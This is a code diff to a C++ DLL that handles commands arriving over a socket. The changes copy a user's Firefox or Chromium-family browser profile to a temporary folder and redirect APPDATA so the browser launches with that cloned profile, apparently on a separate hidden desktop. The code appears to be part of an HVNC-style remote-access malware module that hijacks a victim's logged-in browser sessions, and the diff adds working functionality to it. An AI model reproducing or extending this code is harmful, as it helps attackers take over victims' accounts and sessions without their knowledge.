@@ -2130,6 +2130,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring profilePath;
                     wstring profileDir = L"Default";
+                    bool appdataRedirected = false;
+                    wstring originalAppdata = L"";
+
+                    wchar_t envAppdata[32768];
+                    if (GetEnvironmentVariableW(L"APPDATA", envAppdata, 32768) > 0) {
+                        originalAppdata = envAppdata;
+                    }
 
                     if (copyProfile) {
                         wstring sourceUserData;
@@ -2160,24 +2167,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
                         } catch (...) {}
 
-                        if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
-                            send_error("Failed to copy browser profile.");
-                            return;
-                        }
-
                         if (isGecko) {
-                            wstring realProfilePath = get_firefox_real_profile_path(sourceUserData);
-                            wstring profileSubDir = L"";
-                            if (!realProfilePath.empty()) {
-                                profileSubDir = realProfilePath.substr(realProfilePath.find_last_of(L"\\/") + 1);
+                            wstring destPath = tempProfileRoot + L"\\Mozilla\\Firefox";
+                            if (!copy_profile_parallel(sourceUserData, destPath, "Profiller kopyalanıyor")) {
+                                send_error("Failed to copy browser profile.");
+                                return;
                             }
+                            profilePath = get_firefox_real_profile_path(destPath);
 
-                            if (!profileSubDir.empty()) {
-                                profilePath = tempProfileRoot + L"\\Profiles\\" + profileSubDir;
-                            } else {
-                                profilePath = tempProfileRoot;
-                            }
+                            // Redirect APPDATA environment variable
+                            SetEnvironmentVariableW(L"APPDATA", tempProfileRoot.c_str());
+                            appdataRedirected = true;
                         } else {
+                            if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                send_error("Failed to copy browser profile.");
+                                return;
+                            }
                             WIN32_FIND_DATAW findData;
                             HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                             if (hFind != INVALID_HANDLE_VALUE) {
@@ -2229,7 +2234,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote -allow-downgrade";
-                        if (!profilePath.empty()) {
+                        if (!appdataRedirected && !profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
@@ -2357,6 +2362,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                        if (appdataRedirected) {
+                            SetEnvironmentVariableW(L"APPDATA", originalAppdata.empty() ? NULL : originalAppdata.c_str());
+                        }
                     }
 
                     if (hCurrentDesktop) {
